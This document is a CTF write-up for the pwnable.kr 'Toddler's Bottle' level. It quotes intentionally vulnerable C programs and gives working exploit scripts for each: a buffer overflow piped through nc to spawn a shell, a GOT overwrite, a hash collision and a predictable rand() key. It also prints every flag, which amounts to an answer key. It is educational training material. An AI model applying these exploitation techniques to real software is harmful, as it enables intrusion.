# The Write Up for Toddler's Bottle Level

## Introduction

This is the first level of the [pwnable.kr](http://pwnable.kr/) practices. All in all, the problems in this level provide a very good introduction to CTF beginners.

## Writeup
### fd

In the Linux environment, file descriptor (FD), which is an unsigned integer,is used in FILE I/O. In the header file \<unistd.h\>:

	0 is STDIN_FILENO, which is the standard input.
	1 is STDOUT_FILENO, which is the standard output.
	2 is STDERR_FILENO, which is the standard error.

The vulnerable c source code is followed.

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
	if(argc<2){
		printf("pass argv[1] a number\n");
		return 0;
	}
	int fd = atoi( argv[1] ) - 0x1234;
	int len = 0;
	len = read(fd, buf, 32);
	if(!strcmp("LETMEWIN\n", buf)){
		printf("good job :)\n");
		system("/bin/cat flag");
		exit(0);
	}
	printf("learn about Linux file IO\n");
	return 0;

}
``` 

If argv[1] is set as 4660 (0x1234), the variable fd will be 0, which is the standard input. And then, we just got the flag when we input `LETMEWIN` on the screen.

-

`mommy! I think I know what a file descriptor is!!`

-

### collision

The design of a hash function should consider the collision. In this task, the hash function is a simple sum function. The source code is followed.

```
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
	int* ip = (int*)p;
	int i;
	int res=0;
	for(i=0; i<5; i++){
		res += ip[i];
	}
	return res;
}

int main(int argc, char* argv[]){
	if(argc<2){
		printf("usage : %s [passcode]\n", argv[0]);
		return 0;
	}
	if(strlen(argv[1]) != 20){
		printf("passcode length should be 20 bytes\n");
		return 0;
	}

	if(hashcode == check_password( argv[1] )){
		system("/bin/cat flag");
		return 0;
	}
	else
		printf("wrong passcode.\n");
	return 0;
}
```

The destination hash value is 0x21DD09EC, which should be the sum of five unsigned 32bit integers. The integers should not contain '\x00' byte. So that we chose numbers as followed python code, which is stored in the path `/tmp/ex.py` and then print it.

```
#!/usr/bin/env python
import sys

"""
5 32bit integer:
0x01010101
0x01010101
0x01010101
0x01010101
0x1dd905e8
sum: 0x21DD09EC
"""
val = '\x01\x01\x01\x01'*4+'\xe8\x05\xd9\x1d'

sys.stdout.write(val)
```

Then this command will show us the flag.

```
./col `python /tmp/ex.py`
```

-

`daddy! I just managed to create a hash collision :)`

-

### bof

This is a basic buffer overflow task, but the difficulty may be existed in comunication to the server. If you receive the following message

`*** stack smashing detected ***: /home/bof/bof terminated`

Please just try shell command in this way in your local shell:

``
(python ex.py ; cat - )  |  nc pwnable.kr 9000
``

The command `cat -` will receive response of the new shell, and make sure the system() will not finish too quick.

The vulnerable source code is followed.

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

And the content of the ex.py is followed.

```
#!/usr/bin/env python

import sys

PRE="A"*0x34
SIGN='\xbe\xba\xfe\xca'
OUT=PRE+SIGN
print(OUT)
```

It maybe a little bit difficult to calaculate the distant between the address of `key` and the address of `overflowme`. The easies way is to differ two address of them in GDB. The distant is 0x34 in this case.

The flag is followed.

-
`daddy, I just pwned a buFFer :)`

-

### flag

The binary in this task is packed in UPX format. The first step is unpack the binary to original elf content.

`upx -d flag -o flag.elf`

The output on the screen inspired me.

`I will malloc() and strcpy the flag there. take it.`

There are two ideas in my mind. One is to trace the address of the buffer, whihc is allocated by malloc(). The other is to set breakpoint at libc function strcpy and then monitor the content of parameters. I chose the later one.

This is my gdb init file.

```
info file
display/i $pc
break strcpy
break malloc
set follow-fork-mode child
```

Then gdb showed the flag.

```
Breakpoint 1, 0x00000000004153a0 in __strcpy_ssse3 ()
1: x/i $pc
=> 0x4153a0 <__strcpy_ssse3>:	mov    %rsi,%rcx
(gdb) p/x $rsi
$1 = 0x496628
(gdb) x/s 0x496628
0x496628:	"UPX...? sounds like a delivery service :)"
```

The flag is.

-
`UPX...? sounds like a delivery service :)`

-

### passcode

A very common mistake is fogetting the address symbol & , when a address is needed.

The vulnerable source code is followed.

```
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.0 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;	
}

```

The parameters for the function scanf() should be address, not the value. However, if you insist pass a value to the scanf(), it will be considered as a address.

If we can control the content of the variable passcode1 and passcode2, we will get the flag. The first idea is manipulate the content of the string name[100]. The content of the stack will not be cleaned when the current function is returned. The content in the stack will be reused by the next calling function, which is login() in this case. However, we can only manipulate the initial value of the passcode1, since the variable layout of the stack. The good news is the initial value of the variable passcode1 will be used as a address for the function scanf(). Based on this vulnerability, we can overwrite an 4 byte memory, where the flag is marked as writeable. GOT PLT exploitation technique will be very helpfull in this situation. We can overwrite the PLT record of the function exit() to the value 0x80485d7, which is the address of the login ok logic.

The content of ex.py is:

```
#!/usr/bin/env python
import sys
# 0x0804a018 is exit@GOT
val=0x60*'A'+'\x18\xa0\x04\x08'
print(val)
sys.stdout.flush()
# 134514135 is 0x80485d7
# which is the address of the login ok logic
print(134514135)
sys.stdout.flush()
# The second scanf should be failed
print('XXX')
```

Then we use `python /tmp/ex.py | ./passcode` to escape the login check function.

-
`Sorry mom.. I got confused about scanf usage :(`

-

### random

It is a vulnerability that using rand() without initialisint the seed firstly.

The vulnerable source code is:

```
#include <stdio.h>

int main(){
	unsigned int random;
	random = rand();	// random value!
    printf("random: %d\n",random);
	unsigned int key=0;
	scanf("%d", &key);

	if( (key ^ random) == 0xdeadbeef ){
		printf("Good!\n");
		system("/bin/cat flag");
		return 0;
	}

	printf("Wrong, maybe you should try 2^32 cases.\n");
	return 0;
}

```

I found every time, the random value is 1804289383.
The key will be 1804289383 xor 0xdeadbeef, which is 
3039230856

-
`Mommy, I thought libc random is unpredictable...`

-

### input

This task is mainly to train the ability to communicate the testing server.

Linux programming knowledges,such as pipe ,fork, execve and socket, are necessary.

The source code is followed.

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main(int argc, char* argv[], char* envp[]){
	printf("Welcome to pwnable.kr\n");
	printf("Let's see if you know how to give input to program\n");
	printf("Just give me correct inputs then you will get the flag :)\n");

	// argv
	if(argc != 100) return 0;
	if(strcmp(argv['A'],"\x00")) return 0;
	if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0;
	printf("Stage 1 clear!\n");	

	// stdio
	char buf[4];
	read(0, buf, 4);
	if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0;
	read(2, buf, 4);
        if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0;
	printf("Stage 2 clear!\n");
	
	// env
	if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0;
	printf("Stage 3 clear!\n");

	// file
	FILE* fp = fopen("\x0a", "r");
	if(!fp) return 0;
	if( fread(buf, 4, 1, fp)!=1 ) return 0;
	if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0;
	fclose(fp);
	printf("Stage 4 clear!\n");	

	// network
	int sd, cd;
	struct sockaddr_in saddr, caddr;
	sd = socket(AF_INET, SOCK_STREAM, 0);
	if(sd == -1){
		printf("socket error, tell admin\n");
		return 0;
	}
	saddr.sin_family = AF_INET;
	saddr.sin_addr.s_addr = INADDR_ANY;
	saddr.sin_port = htons( atoi(argv['C']) );
	if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){
		printf("bind error, use another port\n");
    		return 1;
	}
	listen(sd, 1);
	int c = sizeof(struct sockaddr_in);
	cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c);
	if(cd < 0){
		printf("accept error, tell admin\n");
		return 0;
	}
	if( recv(cd, buf, 4, 0) != 4 ) return 0;
	if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;
	printf("Stage 5 clear!\n");

	// here's your flag
	system("/bin/cat flag");	
	return 0;
}
```

The task answer source code exploit.c is followed.

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/param.h>
#include <sys/stat.h> 
#include <fcntl.h>
#include <string.h>
#include <errno.h>
const int argv_len = 101;
char* g_argv[101];
int g_pipe0[2];
char* fd0_text="\x00\x0a\x00\xff";
int g_pipe2[2];
char* fd2_text="\x00\x0a\x02\xff";
char* g_envp[2];
void stage0(){
    chdir("/tmp");
    int ret=symlink("/home/input/flag","/tmp/flag");
    if (-1==ret && errno==EEXIST){
        unlink("/tmp/flag");
        symlink("/home/input/flag","/tmp/flag");
    }
}
void stage1(){
    for (int i=0;i<argv_len;i++){
        g_argv[i]="A";
    } 
    g_argv[0]="/home/input/input";
    g_argv[argv_len-1]=NULL;
    g_argv['A']="\x00";
    g_argv['B']="\x20\x0a\x0d";
    g_argv['C']="65533";
}
void stage2(){
    pipe(g_pipe0);
    pipe(g_pipe2);
}
void stage3(){
    g_envp[0]="\xde\xad\xbe\xef=\xca\xfe\xba\xbe";
    g_envp[1]=NULL;
}
void stage4(){
    int fd = open("\x0a",O_TRUNC|O_WRONLY|O_CREAT);
    if (-1!=fd){
        write(fd,"\x00\x00\x00\x00",4);
        close(fd);
    }     
}
int main(){
    stage0();
    stage1(); 
    stage2();
    stage3(); 
    stage4();
    int ret = fork();
    if (-1==ret){ // error
        printf("fork error:%s\n",strerror(errno));
    }else if (0==ret){ // child
        dup2(g_pipe0[0],0);
        dup2(g_pipe2[0],2);
        int ret=execve(g_argv[0],g_argv,g_envp);
        if (-1==ret){
            printf("execve error:%s\n",strerror(errno));
        }
    }else{ // parrent
        close(g_pipe0[0]);
        close(g_pipe2[0]);
        write(g_pipe0[1],fd0_text,4);
        write(g_pipe2[1],fd2_text,4);
        sleep(3);
        struct sockaddr_in serv_addr;
        int sock = socket(AF_INET,SOCK_STREAM,0);
        memset(&serv_addr,0,sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(atoi(g_argv['C'])); 
        serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
        connect(sock,(struct sockaddr *)&serv_addr,sizeof(serv_addr));
        send(sock,"\xde\xad\xbe\xef",4,0);
        close(sock);
        int stat;
        wait(&stat);
        unlink("\x0a");
    }
    return 0;
}
```

Compile the source code into binary and then scp the binary to the server side by command `scp -P 2222 ./exploit  input@pwnable.kr:/tmp/`. The flag is followed after execution through `/tmp/exploit`.

-
`Mommy! I learned how to pass various input in Linux :)`

-


## Conclusion
## References
1. [rk700](http://rk700.github.io/tags.html#pwnable.kr-ref)